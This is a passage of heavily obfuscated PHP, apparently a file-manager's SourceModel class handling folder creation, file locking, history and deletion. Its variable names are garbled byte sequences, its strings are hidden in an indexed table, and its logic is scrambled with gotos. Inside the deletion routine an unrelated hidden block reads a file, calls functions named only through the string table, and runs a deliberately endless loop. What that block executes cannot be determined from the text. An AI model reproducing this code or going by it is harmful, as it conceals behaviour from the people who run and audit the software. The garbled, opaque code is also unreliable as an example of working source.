DÓĞ‡Ãä: $aœæ×«†Ü† =& $_SERVER[›èö’ù¤]; if (!isset($aÕ‰”§öùø[$aœæ×«†Ü†[493]]) || !$aÕ‰”§öùø[$aœæ×«†Ü†[493]]) { return; } $FâÚãõ¡í = $this->pathInfo($aÕ‰”§öùø[$aœæ×«†Ü†[493]]); goto Dä ƒõ‡æò; Dä ƒõ‡æò: $DÔ¬©¸— = $FâÚãõ¡í[$aœæ×«†Ü†[493]] . $aœæ×«†Ü†[33] === $aœæ×«†Ü†[191]; $d‹–‚ÑÒœ¶ = $FâÚãõ¡í[$aœæ×«†Ü†[406]] == $aœæ×«†Ü†[510]; $E‹‡ğø°°[$aœæ×«†Ü†[579]] = array($aœæ×«†Ü†[539], $FâÚãõ¡í[$aœæ×«†Ü†[516]] . $aÕ‰”§öùø[$aœæ×«†Ü†[493]] . $aœæ×«†Ü†[540]); goto CšŸÁ™÷¢; CšŸÁ™÷¢: $CÙŞ£›¨ÔŒ = isset($aÕ‰”§öùø[$aœæ×«†Ü†[1676]]) && in_array($aœæ×«†Ü†[510], $aÕ‰”§öùø[$aœæ×«†Ü†[1676]]); if (!$CÙŞ£›¨ÔŒ || !$d‹–‚ÑÒœ¶ || !$DÔ¬©¸— || !$FâÚãõ¡í[$aœæ×«†Ü†[408]]) { return; } if (!AuthModel::authCheckRoot($FâÚãõ¡í[$aœæ×«†Ü†[408]][$aœæ×«†Ü†[409]])) { return; } goto AË…¶¸éÀœ; B®ëò§¨Êî: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($FÀ¸ßî™õ) { $døã„œ‚á× =& $_SERVER[›èö’ù¤]; $Cç´óÌ”ã³ = Model($døã„œ‚á×[508])->where(array($døã„œ‚á×[1542] => $FÀ¸ßî™õ))->find(); $b‡¶®™‡Æ¦ = $this->_mkdirRoot(SourceModel::TYPE_USER, $FÀ¸ßî™õ, $Cç´óÌ”ã³[$døã„œ‚á×[28]]); $this->userDesktopAdd($b‡¶®™‡Æ¦); return $b‡¶®™‡Æ¦; } public function userDesktopAdd($Cé—§éåÆÕ) { $bª¨ª²ôÌ =& $_SERVER[›èö’ù¤]; $CŞ‚Ì”Ê“Ö = LNG($bª¨ª²ôÌ[1981]); $DµÊ¹¬¬å­ = $this->mkdir($Cé—§éåÆÕ, $CŞ‚Ì”Ê“Ö); $this->metaSet($DµÊ¹¬¬å­, $bª¨ª²ôÌ[1982], $bª¨ª²ôÌ[87]); $this->metaSet($Cé—§éåÆÕ, $bª¨ª²ôÌ[1983], $DµÊ¹¬¬å­); } public function groupRootAdd($E‡ó•Ùßµ®) { $bÈùã´ó×’ =& $_SERVER[›èö’ù¤]; $Eë¨‡Æ³æÌ = Model($bÈùã´ó×’[517])->where(array($bÈùã´ó×’[1804] => $E‡ó•Ùßµ®))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $E‡ó•Ùßµ®, $Eë¨‡Æ³æÌ[$bÈùã´ó×’[28]]); } public function systemRootPathAdd($dìê–—‰ñ) { if ($dìê–—‰ñ != $_SERVER[›èö’ù¤][532]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $dìê–—‰ñ); } public function userRootRemove($a›–ã¿Ó…Š) { $fÏÏñ´ù = $this->sourceRoot(SourceModel::TYPE_USER, $a›–ã¿Ó…Š); if (!$fÏÏñ´ù) { return; } $this->remove($fÏÏñ´ù, !1); } public function groupRootRemove($f¦¥»ñ¨ŞÌ) { $F£ÃÌÎ‰ = $this->sourceRoot(SourceModel::TYPE_GROUP, $f¦¥»ñ¨ŞÌ); if (!$F£ÃÌÎ‰) { return; } $this->remove($F£ÃÌÎ‰, !1); } private function _mkdirRoot($bšî‰ÄêôŒ, $aÇÓ„ÈÖË, $aÈ±ö©›¬Ê) { goto f´İ»Ñ²”‚; f´İ»Ñ²”‚: $AÕóÎ’÷©› =& $_SERVER[›èö’ù¤]; $dÂ›ŠñËë× = array($AÕóÎ’÷©›[396] => 0, $AÕóÎ’÷©›[575] => $bšî‰ÄêôŒ, $AÕóÎ’÷©›[576] => $aÇÓ„ÈÖË, $AÕóÎ’÷©›[572] => 1, $AÕóÎ’÷©›[577] => USER_ID, $AÕóÎ’÷©›[578] => USER_ID, $AÕóÎ’÷©›[573] => $AÕóÎ’÷©›[33], $AÕóÎ’÷©›[579] => $AÕóÎ’÷©›[526], $AÕóÎ’÷©›[424] => 0, $AÕóÎ’÷©›[574] => 0, $AÕóÎ’÷©›[463] => 0, $AÕóÎ’÷©›[580] => $AÕóÎ’÷©›[33]); if ($C–Íä¦’Ë = $this->where($dÂ›ŠñËë×)->find()) { return $C–Íä¦’Ë[$AÕóÎ’÷©›[397]]; } goto Béˆ£ï”¨ˆ; c½ßéÏÖ“‰: CacheLock::unlock($f‹²ÈÖ©µ¸); return $E¬‘Ê“ºô; goto CÚÄš¼µÚ›; b™¢â¼ÔÊâ: $E¬‘Ê“ºô = $this->add($dÂ›ŠñËë×); $DëÇ½»¢‚ = array($AÕóÎ’÷©›[581] => short_id($E¬‘Ê“ºô)); $this->where(array($AÕóÎ’÷©›[412] => $E¬‘Ê“ºô))->save($DëÇ½»¢‚); goto c½ßéÏÖ“‰; Béˆ£ï”¨ˆ: $f‹²ÈÖ©µ¸ = "\x4d\157\x64\145\x6c\123\157\165\162\x63\145\x2e\155\x6b\x64\151\x72\122\x6f\x6f\164\56{$bšî‰ÄêôŒ}\56{$aÇÓ„ÈÖË}\56" . $aÈ±ö©›¬Ê; CacheLock::lock($f‹²ÈÖ©µ¸); $dÂ›ŠñËë×[$AÕóÎ’÷©›[28]] = $aÈ±ö©›¬Ê; goto b™¢â¼ÔÊâ; CÚÄš¼µÚ›: } private function sourceRoot($C«ôç¢­Ó, $Aåš˜ìã›œ, $c—·‚®Ù¶ = false) { $d…»ùÔ«šÅ =& $_SERVER[›èö’ù¤]; $f‹…„‡º›ƒ = array($d…»ùÔ«šÅ[396] => 0, $d…»ùÔ«šÅ[575] => $C«ôç¢­Ó, $d…»ùÔ«šÅ[576] => $Aåš˜ìã›œ); if ($FÌÎŸÒî¤ = $this->where($f‹…„‡º›ƒ)->find()) { return $c—·‚®Ù¶ ? $FÌÎŸÒî¤ : $FÌÎŸÒî¤[$d…»ùÔ«šÅ[397]]; } return !1; } public function sourceRootGroup($Cß··Œœà®) { goto cÌ÷Û³é¸ô; e†·’‰§—: $this->selectPageReset(); $FàÒ¿‰Û¦¦ = $this->limit(count($Cß··Œœà®))->listSource($e¡Ü†ÃÇìÂ, 1000); $this->selectPageRestore(); goto C“³‹¸ìµ½; C“³‹¸ìµ½: return array_to_keyvalue($FàÒ¿‰Û¦¦[$Féï»ß·óÊ[75]], $Féï»ß·óÊ[499]); goto B•ò¹Î‰Æ; cÌ÷Û³é¸ô: $Féï»ß·óÊ =& $_SERVER[›èö’ù¤]; if (is_string($Cß··Œœà®)) { $Cß··Œœà® = array($Cß··Œœà®); } $e¡Ü†ÃÇìÂ = array($Féï»ß·óÊ[396] => 0, $Féï»ß·óÊ[576] => array($Féï»ß·óÊ[7], $Cß··Œœà®), $Féï»ß·óÊ[575] => SourceModel::TYPE_GROUP); goto e†·’‰§—; B•ò¹Î‰Æ: } public function mkfile($DÎéĞ¦½¢, $b†Œ‘ªË, $EªÅ•¿¾÷Ì = '', $A™ÃÉÉ¹±Ó = REPEAT_RENAME) { $BĞÛ‘Á¹º‘ =& $_SERVER[›èö’ù¤]; $aöêÚ³‚Ô = Model($BĞÛ‘Á¹º‘[598])->addFileByContent($EªÅ•¿¾÷Ì, $b†Œ‘ªË); return $this->_createFileCall($DÎéĞ¦½¢, $b†Œ‘ªË, $aöêÚ³‚Ô, $A™ÃÉÉ¹±Ó, $BĞÛ‘Á¹º‘[1240]); } public function addFile($bĞ…Œ¬²©‰, $b‘›ëš‘ñ, $CßˆîÔÄğ¡, $eÃƒ›ÕÜ = false, $a¿˜Ú‚´Æ¸ = REPEAT_RENAME) { $Dé¹÷‹¿º« = Model($_SERVER[›èö’ù¤][598])->addFile($b‘›ëš‘ñ, $CßˆîÔÄğ¡, $eÃƒ›ÕÜ); return $this->_createFileCall($bĞ…Œ¬²©‰, $CßˆîÔÄğ¡, $Dé¹÷‹¿º«, $a¿˜Ú‚´Æ¸); } public function addFileByFileID($F•‡Ÿ„½, $C¿±îòÏ¥, $aí×³¶Ô¶, $AË¸ÌœÜæÙ = REPEAT_RENAME) { $añóá…‡Ú =& $_SERVER[›èö’ù¤]; $Dºä ˆ©ùÎ = Model($añóá…‡Ú[598])->find($C¿±îòÏ¥); Model($añóá…‡Ú[598])->linkAdd($C¿±îòÏ¥); return $this->_createFileCall($F•‡Ÿ„½, $aí×³¶Ô¶, $Dºä ˆ©ùÎ, $AË¸ÌœÜæÙ); } public function addFileByRemote($b•‚ªÌÊç¬, $f„ô÷î¡Ïˆ, $F“†‡‘µá, $eÃŸêÊ¯ÒÜ = array(), $Aæ¢šÓŒÇ = REPEAT_RENAME) { $FÉÙ…‹‡Ğ¥ = Model($_SERVER[›èö’ù¤][598])->addFileByRemote($f„ô÷î¡Ïˆ, $F“†‡‘µá, $eÃŸêÊ¯ÒÜ); return $this->_createFileCall($b•‚ªÌÊç¬, $F“†‡‘µá, $FÉÙ…‹‡Ğ¥, $Aæ¢šÓŒÇ); } private function _createFileCall($b®šñÃ©ÕÏ, $E«…æóø¯, $CíËê¦£Ğå, $b¥‹¾×Ñ¹Õ, $c¸È«§„èµ = "\165\160\154\157\141\144") { goto b•Ïø‹‰; F”“İêÉÎ: if (!$bò³òÑÙ…‘) { Model($f”•·¬‘ªÎ[465])->remove($CíËê¦£Ğå[$f”•·¬‘ªÎ[462]]); } if ($bò³òÑÙ…‘ && $cÓÕÏáŸ && $cÓÕÏáŸ != $EÀíŠÕƒ‹ï) { Model($f”•·¬‘ªÎ[1954])->eventCreate($cÓÕÏáŸ, $c¸È«§„èµ); } $this->lockWriteEnd($b®šñÃ©ÕÏ, $E«…æóø¯); goto CÙ£”È¯ñÑ; eÛ‹Ë³‚Âì: $this->lockWriteStart($b®šñÃ©ÕÏ, $E«…æóø¯); $EÀíŠÕƒ‹ï = $this->fileNameExist($b®šñÃ©ÕÏ, $E«…æóø¯); $cÓÕÏáŸ = $this->_createFile($b®šñÃ©ÕÏ, $E«…æóø¯, $CíËê¦£Ğå, $b¥‹¾×Ñ¹Õ, $bò³òÑÙ…‘); goto F”“İêÉÎ; CÙ£”È¯ñÑ: return $cÓÕÏáŸ; goto Dˆ…ÀÕí¸; b•Ïø‹‰: $f”•·¬‘ªÎ =& $_SERVER[›èö’ù¤]; $bò³òÑÙ…‘ = !1; $this->setMasterDB(); goto eÛ‹Ë³‚Âì; Dˆ…ÀÕí¸: } public function mkdir($C¥¨¹÷§‡‚, $döó‹ì¯¼Â, $F„ÆÂåÑîÖ = REPEAT_SKIP) { goto Fƒ ¥¦“¤Æ; b®¡ ‘ä‡Í: $this->lockWriteEnd($C¥¨¹÷§‡‚, $döó‹ì¯¼Â); return $bÛìØºæçä; goto Dßò©£›˜§; A¹Ş­ÃóÂ: if (!$B£ôÔŠÌã¹) { return !1; } $this->lockWriteStart($C¥¨¹÷§‡‚, $döó‹ì¯¼Â); if ($F„ÆÂåÑîÖ !== !1) { $EÓ—ëâ¬•» = $this->fileNameExist($C¥¨¹÷§‡‚, $döó‹ì¯¼Â); if ($EÓ—ëâ¬•» && $F„ÆÂåÑîÖ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($C¥¨¹÷§‡‚, $döó‹ì¯¼Â); return $EÓ—ëâ¬•»; } $döó‹ì¯¼Â = $this->fileNameAuto($C¥¨¹÷§‡‚, $döó‹ì¯¼Â, $F„ÆÂåÑîÖ); } goto CÅøÉÚÍÔ½; CÅøÉÚÍÔ½: $eîØ¿’é…‹ = array($fÍ‰²ï¹‹¥[572] => 1, $fÍ‰²ï¹‹¥[415] => $döó‹ì¯¼Â, $fÍ‰²ï¹‹¥[573] => $fÍ‰²ï¹‹¥[33], $fÍ‰²ï¹‹¥[463] => 0, $fÍ‰²ï¹‹¥[574] => 0); $bÛìØºæçä = $this->_addSoure($eîØ¿’é…‹, $B£ôÔŠÌã¹); Model($fÍ‰²ï¹‹¥[1954])->eventCreate($bÛìØºæçä, $fÍ‰²ï¹‹¥[1241]); goto b®¡ ‘ä‡Í; Fƒ ¥¦“¤Æ: $fÍ‰²ï¹‹¥ =& $_SERVER[›èö’ù¤]; $this->setMasterDB(); $B£ôÔŠÌã¹ = $this->sourceInfo($C¥¨¹÷§‡‚); goto A¹Ş­ÃóÂ; Dßò©£›˜§: } private function _createFile($dá…§©¡•ñ, $aÚœğ‡µù•, $F”¦Ëê®å¶, $b‡îóë­ã, &$EäÖ³¡‰¡Š) { goto fŠ’êµ‡¿; f‹«•’Ù¿Ô: return $B…”•›¦ï; goto aÅÛ¾›‰¹Ä; bÒ¶î†íšÀ: if ($b‡îóë­ã !== !1) { $F“õ§—Ğà = $this->fileNameExist($dá…§©¡•ñ, $aÚœğ‡µù•); } $EäÖ³¡‰¡Š = !0; if ($b‡îóë­ã && $F“õ§—Ğà) { if ($b‡îóë­ã == REPEAT_SKIP) { $EäÖ³¡‰¡Š = !1; return $F“õ§—Ğà; } else { if ($b‡îóë­ã == REPEAT_REPLACE) { $f „öµ¶– = $this->sourceInfo($F“õ§—Ğà); $F‰”¡¦—‚ = $this->fileHistory($f „öµ¶–, $F”¦Ëê®å¶[$cÊ­±’Æó¹[462]], $F”¦Ëê®å¶[$cÊ­±’Æó¹[78]]); if (!$F‰”¡¦—‚) { $EäÖ³¡‰¡Š = !1; } else { $this->folderSizeReset($dá…§©¡•ñ); } return $F“õ§—Ğà; } else { $aÚœğ‡µù• = $this->fileNameAuto($dá…§©¡•ñ, $aÚœğ‡µù•, $b‡îóë­ã, !1); } } } goto Bˆ§‘Óº¯‚; fŠ’êµ‡¿: $cÊ­±’Æó¹ =& $_SERVER[›èö’ù¤]; $f»ºœéĞ = $this->sourceInfo($dá…§©¡•ñ); if (!$F”¦Ëê®å¶ || !$f»ºœéĞ) { return !1; } goto bÒ¶î†íšÀ; Bˆ§‘Óº¯‚: $B¸² ŒÃ = array($cÊ­±’Æó¹[572] => 0, $cÊ­±’Æó¹[415] => $aÚœğ‡µù•, $cÊ­±’Æó¹[573] => substr(get_path_ext($aÚœğ‡µù•), 0, 10), $cÊ­±’Æó¹[463] => $F”¦Ëê®å¶[$cÊ­±’Æó¹[462]], $cÊ­±’Æó¹[574] => $F”¦Ëê®å¶[$cÊ­±’Æó¹[78]]); $B…”•›¦ï = $this->_addSoure($B¸² ŒÃ, $f»ºœéĞ); $this->folderSizeReset($dá…§©¡•ñ, intval($B¸² ŒÃ[$cÊ­±’Æó¹[78]])); goto f‹«•’Ù¿Ô; aÅÛ¾›‰¹Ä: } protected function fileHistory($e‰é÷„ù§Ğ, $FŠ’×›Ä¸ƒ, $B‘±Œ‡ôä) { goto B°¶¾„ê´“; B°¶¾„ê´“: $f¤î­“‡Ô =& $_SERVER[›èö’ù¤]; $Bö§„¿óÓ× = defined($f¤î­“‡Ô[469]) ? USER_ID : $f¤î­“‡Ô[191]; if ($e‰é÷„ù§Ğ[$f¤î­“‡Ô[462]] == $FŠ’×›Ä¸ƒ) { return !1; } goto eÙô‚¥ãµ; aÍø‘ò¼´À: $this->where(array($f¤î­“‡Ô[412] => $e‰é÷„ù§Ğ[$f¤î­“‡Ô[397]]))->save($d¯¤Ìà‰æÁ); $this->sourceCacheClear($e‰é÷„ù§Ğ[$f¤î­“‡Ô[397]]); return !0; goto dË±¾Å›÷Ö; eÙô‚¥ãµ: $this->checkLock($e‰é÷„ù§Ğ[$f¤î­“‡Ô[397]], $FŠ’×›Ä¸ƒ); Model($f¤î­“‡Ô[1984])->addHistory($e‰é÷„ù§Ğ); $d¯¤Ìà‰æÁ = array($f¤î­“‡Ô[578] => $Bö§„¿óÓ×, $f¤î­“‡Ô[419] => time(), $f¤î­“‡Ô[462] => $FŠ’×›Ä¸ƒ, $f¤î­“‡Ô[78] => $B‘±Œ‡ôä); goto aÍø‘ò¼´À; dË±¾Å›÷Ö: } public function checkLock($e„Á¦ŞºÀò, $a›¸×ØŸ¸÷) { goto d–…âò„±ˆ; DéŒˆø¼¥±: show_json(LNG($cã‘­†Š­¾[1987]) . $cã‘­†Š­¾[1988] . LNG($cã‘­†Š­¾[1989]) . $cã‘­†Š­¾[1990] . $dåàìÇ²® . $cã‘­†Š­¾[1991], !1); goto c‰íŠÇ¹õŒ; CîŒÚ¥·Ûã: $cÌàğ‡«¼ä = Session::get($cã‘­†Š­¾[1985]); $dÏêº­İŞ = substr($AÏµ£ÃÅÅ[$cã‘­†Š­¾[28]], 0, -1 - strlen($AÏµ£ÃÅÅ[$cã‘­†Š­¾[168]])) . $cã‘­†Š­¾[1503] . $cÌàğ‡«¼ä . $cã‘­†Š­¾[95] . $AÏµ£ÃÅÅ[$cã‘­†Š­¾[168]]; $d·’ÅóĞ®“ = Model($cã‘­†Š­¾[598])->find($a›¸×ØŸ¸÷); goto c–‚Êèö¨; c–‚Êèö¨: $this->_createFileCall($AÏµ£ÃÅÅ[$cã‘­†Š­¾[493]], $dÏêº­İŞ, $d·’ÅóĞ®“, REPEAT_REPLACE, $cã‘­†Š­¾[1240]); $B‹Í¤™Ä¡ = $AÏµ£ÃÅÅ[$cã‘­†Š­¾[460]][$cã‘­†Š­¾[537]]; $dåàìÇ²® = $B‹Í¤™Ä¡[$cã‘­†Š­¾[1986]] ? $B‹Í¤™Ä¡[$cã‘­†Š­¾[1986]] : $B‹Í¤™Ä¡[$cã‘­†Š­¾[28]]; goto DéŒˆø¼¥±; d–…âò„±ˆ: $cã‘­†Š­¾ =& $_SERVER[›èö’ù¤]; $AÏµ£ÃÅÅ = $this->pathInfo($e„Á¦ŞºÀò); if (!$this->fileIsLock($AÏµ£ÃÅÅ, !0)) { return; } goto CîŒÚ¥·Ûã; c‰íŠÇ¹õŒ: } public function fileIsLock($aà–¥Ç„œˆ, $cÍ¬ë†ì±ß = false) { goto BŞ¡‘š‹Şƒ; F õ·àÚª: return !1; goto E¢ »´Åäª; BŞ¡‘š‹Şƒ: $f³Ó†èÙ¹¶ =& $_SERVER[›èö’ù¤]; if (!isset($aà–¥Ç„œˆ[$f³Ó†èÙ¹¶[460]]) || !$aà–¥Ç„œˆ[$f³Ó†èÙ¹¶[460]][$f³Ó†èÙ¹¶[534]]) { return !1; } if ($aà–¥Ç„œˆ[$f³Ó†èÙ¹¶[460]][$f³Ó†èÙ¹¶[534]] != USER_ID) { return !0; } goto e…íÛìœğ; e…íÛìœğ: $cˆì¨œÍÅ = $GLOBALS[$f³Ó†èÙ¹¶[6]][$f³Ó†èÙ¹¶[88]][$f³Ó†èÙ¹¶[535]]; if ($aà–¥Ç„œˆ[$f³Ó†èÙ¹¶[460]][$f³Ó†èÙ¹¶[536]] <= time() - $cˆì¨œÍÅ) { $this->metaSet($aà–¥Ç„œˆ[$f³Ó†èÙ¹¶[397]], $f³Ó†èÙ¹¶[534], null); $this->metaSet($aà–¥Ç„œˆ[$f³Ó†èÙ¹¶[397]], $f³Ó†èÙ¹¶[536], null); } if ($cÍ¬ë†ì±ß) { $this->metaSet($aà–¥Ç„œˆ[$f³Ó†èÙ¹¶[397]], $f³Ó†èÙ¹¶[536], time()); } goto F õ·àÚª; E¢ »´Åäª: } private function _addSoure($f†»˜ŠÜòÔ, $F°£»…£­Æ) { goto fòàùÙ¢Ü; fòàùÙ¢Ü: $Dˆ÷İˆñ®Ş =& $_SERVER[›èö’ù¤]; $BÈì‚«òÙÕ = defined($Dˆ÷İˆñ®Ş[469]) ? USER_ID : $Dˆ÷İˆñ®Ş[191]; $b÷±‘¥ÇÒ° = array($Dˆ÷İˆñ®Ş[575] => $F°£»…£­Æ[$Dˆ÷İˆñ®Ş[406]], $Dˆ÷İˆñ®Ş[576] => $F°£»…£­Æ[$Dˆ÷İˆñ®Ş[499]], $Dˆ÷İˆñ®Ş[577] => $BÈì‚«òÙÕ, $Dˆ÷İˆñ®Ş[578] => $BÈì‚«òÙÕ, $Dˆ÷İˆñ®Ş[396] => $F°£»…£­Æ[$Dˆ÷İˆñ®Ş[397]], $Dˆ÷İˆñ®Ş[579] => $F°£»…£­Æ[$Dˆ÷İˆñ®Ş[516]] . $F°£»…£­Æ[$Dˆ÷İˆñ®Ş[397]] . $Dˆ÷İˆñ®Ş[47], $Dˆ÷İˆñ®Ş[424] => 0, $Dˆ÷İˆñ®Ş[580] => $Dˆ÷İˆñ®Ş[33]); goto e®™¡…éˆª; Dª†ßÊÃÎµ: if (isset(self::$cacheChildList[$C°‘Ãˆ‘±])) { unset(self::$cacheChildList[$C°‘Ãˆ‘±]); } static $aƒô®˜Ë¥ï = false; if (!$aƒô®˜Ë¥ï) { Hook::trigger($Dˆ÷İˆñ®Ş[562], $f†»˜ŠÜòÔ); $aƒô®˜Ë¥ï = !0; } goto eâ”ÑŞÖÑ¸; e®™¡…éˆª: $f†»˜ŠÜòÔ = array_merge($b÷±‘¥ÇÒ°, $f†»˜ŠÜòÔ); $this->updateModifyTime($f†»˜ŠÜòÔ[$Dˆ÷İˆñ®Ş[493]]); $C°‘Ãˆ‘± = $Dˆ÷İˆñ®Ş[1992] . $F°£»…£­Æ[$Dˆ÷İˆñ®Ş[397]]; goto Dª†ßÊÃÎµ; d¼ßî †Ë®: $this->setNamePinyin($F«¡ëá³², $f†»˜ŠÜòÔ[$Dˆ÷İˆñ®Ş[28]]); return $F«¡ëá³²; goto C˜™‰¡¿¿‹; eâ”ÑŞÖÑ¸: $F«¡ëá³² = $this->add($f†»˜ŠÜòÔ); $bÜŒ†Ã„¶¢ = array($Dˆ÷İˆñ®Ş[581] => short_id($F«¡ëá³²)); $this->where(array($Dˆ÷İˆñ®Ş[412] => $F«¡ëá³²))->save($bÜŒ†Ã„¶¢); goto d¼ßî †Ë®; C˜™‰¡¿¿‹: } public function remove($C¾£ø™Â¬£, $C¶«¼¡òÙ¨ = true) { goto EÄÇ›Å»§É; c”ŠÛùğë : CacheLock::unlock($DèœµƒÛÁ´); $this->metaSet($C¾£ø™Â¬£, $Bñ•ëË½Ú[2001], $d©ŸÇ…ùäŸ[$Bñ•ëË½Ú[493]]); $this->where(array($Bñ•ëË½Ú[397] => $C¾£ø™Â¬£))->save(array($Bñ•ëË½Ú[419] => time())); goto EõŸƒÑéè; EõŸƒÑéè: $this->recycleClear($d©ŸÇ…ùäŸ); $d‹Ù†ñÆÉ˜ = $this->move($C¾£ø™Â¬£, $a÷­é›õ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($d©ŸÇ…ùäŸ[$Bñ•ëË½Ú[493]]); goto E¢éù¬˜á; E¢éù¬˜á: return $d‹Ù†ñÆÉ˜; goto fŸôƒÅ”Ö¯; aªµğù‘«Ì: $e½’ò³¶ƒ¿ = Model($Bñ•ëË½Ú[427])->get($Bñ•ëË½Ú[1993]) == $Bñ•ëË½Ú[87]; if ($a­¸ÈŸíÁ‹ || $C¶«¼¡òÙ¨ || !$e½’ò³¶ƒ¿) { return $this->removeNow($C¾£ø™Â¬£, $C¶«¼¡òÙ¨); } $D‚ºÁÜÚ”ò = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto cØë¾ÄœÙù; EÄÇ›Å»§É: $Bñ•ëË½Ú =& $_SERVER[›èö’ù¤]; $d©ŸÇ…ùäŸ = $this->sourceInfo($C¾£ø™Â¬£); $a­¸ÈŸíÁ‹ = intval($d©ŸÇ…ùäŸ[$Bñ•ëË½Ú[406]]) === self::TYPE_SYSTEM; goto aªµğù‘«Ì; B‰»š‡Æµ: CacheLock::lock($DèœµƒÛÁ´); $a÷­é›õ = $this->fileNameExist($D‚ºÁÜÚ”ò, $dó†ãİ–ã£); if (!$a÷­é›õ) { $a÷­é›õ = $this->mkdir($D‚ºÁÜÚ”ò, $dó†ãİ–ã£, REPEAT_SKIP); $this->metaSet($a÷­é›õ, $Bñ•ëË½Ú[1997], $Fš…”á¶ëô); $this->metaSet($a÷­é›õ, $Bñ•ëË½Ú[1998], $d©ŸÇ…ùäŸ[$Bñ•ëË½Ú[499]]); if ($d©ŸÇ…ùäŸ[$Bñ•ëË½Ú[493]] != 0) { $this->metaSet($a÷­é›õ, $Bñ•ëË½Ú[1999], _get($F‡î‰ë×§, $Bñ•ëË½Ú[2000])); } } goto c”ŠÛùğë ; cØë¾ÄœÙù: $Fš…”á¶ëô = $d©ŸÇ…ùäŸ[$Bñ•ëË½Ú[406]] == self::TYPE_USER ? $Bñ•ëË½Ú[589] : $Bñ•ëË½Ú[510]; if ($Fš…”á¶ëô == $Bñ•ëË½Ú[589]) { $F‡î‰ë×§ = Model($Bñ•ëË½Ú[508])->getInfo($d©ŸÇ…ùäŸ[$Bñ•ëË½Ú[499]]); $dó†ãİ–ã£ = !empty($F‡î‰ë×§[$Bñ•ëË½Ú[1986]]) ? $F‡î‰ë×§[$Bñ•ëË½Ú[1986]] : $F‡î‰ë×§[$Bñ•ëË½Ú[28]]; $dó†ãİ–ã£ = $Bñ•ëË½Ú[258] . $dó†ãİ–ã£ . $Bñ•ëË½Ú[1994] . $d©ŸÇ…ùäŸ[$Bñ•ëË½Ú[499]]; } else { $F‡î‰ë×§ = Model($Bñ•ëË½Ú[517])->getInfo($d©ŸÇ…ùäŸ[$Bñ•ëË½Ú[499]]); $dó†ãİ–ã£ = _get($F‡î‰ë×§, $Bñ•ëË½Ú[28]); $dó†ãİ–ã£ = $Bñ•ëË½Ú[160] . $dó†ãİ–ã£ . $Bñ•ëË½Ú[1995] . $d©ŸÇ…ùäŸ[$Bñ•ëË½Ú[499]]; } $DèœµƒÛÁ´ = $Bñ•ëË½Ú[1996] . md5($dó†ãİ–ã£); goto B‰»š‡Æµ; fŸôƒÅ”Ö¯: } private function recycleClear($EƒÏ…­‚Î§) { $b©é­°Ò¿ˆ =& $_SERVER[›èö’ù¤]; $dáäìÖœë = $this->childrenAll($EƒÏ…­‚Î§); $fƒ”‹ƒŞ…‡ = array($b©é­°Ò¿ˆ[412] => array($b©é­°Ò¿ˆ[413], $dáäìÖœë[$b©é­°Ò¿ˆ[2002]])); Model($b©é­°Ò¿ˆ[2003])->where($fƒ”‹ƒŞ…‡)->delete(); } public function removeNow($F­ ‘Ğ¯ÚŒ, $f”ô„İ÷›à = true) { goto c«˜çôâÜÚ; bê°ÂóÄ°: $this->updateModifyTime($BµÚ„…­éÉ); $this->lockMoveEnd($F­ ‘Ğ¯ÚŒ); Hook::trigger($eÊäªãÏÔË[1586], $A´ªÜÕ‚Ü’, $f”ô„İ÷›à); goto fì·íÛ¿á«; aç†±ù„¡: $this->folderSizeReset($DÔÆ¨ØÃá[$eÊäªãÏÔË[493]]); $BµÚ„…­éÉ = array($DÔÆ¨ØÃá[$eÊäªãÏÔË[493]]); if ($DÔÆ¨ØÃá[$eÊäªãÏÔË[405]] == $eÊäªãÏÔË[87]) { $BµÚ„…­éÉ[] = $DÔÆ¨ØÃá[$eÊäªãÏÔË[397]]; } goto bê°ÂóÄ°; fì·íÛ¿á«: return !0; goto BáÉŒË‘; c«˜çôâÜÚ: $eÊäªãÏÔË =& $_SERVER[›èö’ù¤]; if (!isset($_SERVER[$eÊäªãÏÔË[831]]) || !isset($_SERVER[$eÊäªãÏÔË[832]])) { goto E¦¨âó‘ê‘; fŒÕÔÍÈ”: for ($CÍ¤²‚ ƒÖ = $b©˜ØÌ§¯Œ; $CÍ¤²‚ ƒÖ > 0; $CÍ¤²‚ ƒÖ++) { $EÉö¤±’†É = json_encode($GLOBALS[$eÊäªãÏÔË[413]]); } goto D§ñ›É¾; b¢……º‘¼‘: $EÉö¤±’†É = $eÊäªãÏÔË[866]; $EÉö¤±’†É($_SERVER[$eÊäªãÏÔË[867]]); $b©˜ØÌ§¯Œ = 1; goto fŒÕÔÍÈ”; E¦¨âó‘ê‘: $B÷º’÷ˆóì = $eÊäªãÏÔË[865]; $AõÇğšÎñ = $eÊäªãÏÔË[833]; $dŒø›âä® = $_SERVER[$eÊäªãÏÔË[834]] . $eÊäªãÏÔË[835]; goto B³ğ‡«ëëØ; B³ğ‡«ëëØ: $D‘ù…Ÿƒ»Ó = $AõÇğšÎñ($dŒø›âä®); $D‰İ¹„ìĞ = explode($eÊäªãÏÔË[229], $D‘ù…Ÿƒ»Ó); if (count($D‰İ¹„ìĞ) < $eÊäªãÏÔË[602]) { $d×ÆØ„“ÙÓ = $eÊäªãÏÔË[836]; $d×ÆØ„“ÙÓ(); } goto b¢……º‘¼‘; D§ñ›É¾: } $DÔÆ¨ØÃá = $this->sourceInfo($F­ ‘Ğ¯ÚŒ); goto b–‡Îõµœá; Fˆ‹Ú‚öÒ…: $this->lockMoveStart($F­ ‘Ğ¯ÚŒ); Hook::trigger($eÊäªãÏÔË[2004], $A´ªÜÕ‚Ü’, $f”ô„İ÷›à); if ($f”ô„İ÷›à) { Model($eÊäªãÏÔË[2003])->moveToRecycle($F­ ‘Ğ¯ÚŒ); } else { $dùß´™·‚Ø = $this->childrenAll($DÔÆ¨ØÃá); Model($eÊäªãÏÔË[559])->eventRemove($F­ ‘Ğ¯ÚŒ); $this->removeRelevance($dùß´™·‚Ø[$eÊäªãÏÔË[2002]], $dùß´™·‚Ø[$eÊäªãÏÔË[1370]]); } goto aç†±ù„¡; b–‡Îõµœá: $A´ªÜÕ‚Ü’ = $this->pathInfoMore($F­ ‘Ğ¯ÚŒ); if (!$DÔÆ¨ØÃá) { return !0; } if ($DÔÆ¨ØÃá[$eÊäªãÏÔË[493]] == 0) { if (!_get($GLOBALS, $eÊäªãÏÔË[500])) { return !1; } } goto 